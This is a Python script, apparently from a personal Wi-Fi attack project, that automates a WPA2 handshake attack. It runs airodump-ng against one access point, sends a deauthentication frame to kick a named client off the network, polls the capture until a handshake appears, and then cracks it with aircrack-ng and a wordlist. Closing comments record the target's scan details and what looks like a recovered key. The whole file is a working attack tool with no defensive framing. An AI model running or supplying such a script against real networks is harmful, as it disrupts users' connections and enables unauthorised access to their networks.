#!venv/bin/python

import os, sys, subprocess, time
import threading
from threading import Thread, Event

interface = "wlp1s0"
# Struhar - 5GHz
ssid = "Test_Wifi"
bssid = "42:ed:00:17:e0:d8"
channel = "5"

client_mac = "9a:23:6b:36:1f:1b"

output_dir = f"/home/filip/Coding/WiFighter/attacks/handshake_crack/{ssid}"
output_file= f"{output_dir}/{ssid}"


# Function to run airodump-ng
def run_airodump(interface, ssid, bssid, channel, output_dir):
    #return subprocess.Popen(['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/{ssid}', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    os.popen(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_dir}/{ssid} {interface}")
    if event.is_set():
        print('Airodump stopped...')
        exit

# Function to run aireplay-ng
def run_aireplay(interface, bssid, client_mac):
    #subprocess.call(['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface])
    os.popen(f"sudo aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")

airodump_thread = threading.Thread(target = run_airodump, args=(interface, ssid, bssid, channel, output_dir))
aireplay_thread = threading.Thread(target = run_aireplay, args=(interface, bssid, client_mac))

event = Event()

airodump_thread.start()
time.sleep(2)

aireplay_thread.start()
aireplay_thread.join()
print(f"[1] Client {client_mac} deauthicated")

captured = False
print('[2] Waiting for handshake...')
while not captured:
    if os.path.exists(f"{output_dir}/{ssid}-01.cap"):
        verify = os.popen(f"sudo aircrack-ng {output_dir}/{ssid}-01.cap").read()
        if "(1 handshake)" in verify:
            captured = True

    time.sleep(3)

print("[3] Handshake captured!")
event.set()

os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{ssid}-01.cap")






#  {'SSID': 'Test_Wifi', 'BSSID': '42:ed:00:17:e0:d8', 'Channel': '5', 'Signal': '-46', 'Band': '2.4 GHz', 'Encryption': 'WPA2', 'Auth': 'PSK', 'Cipher': 'CCMP'}
#  9a:23:6b:36:1f:1b
#  81203666
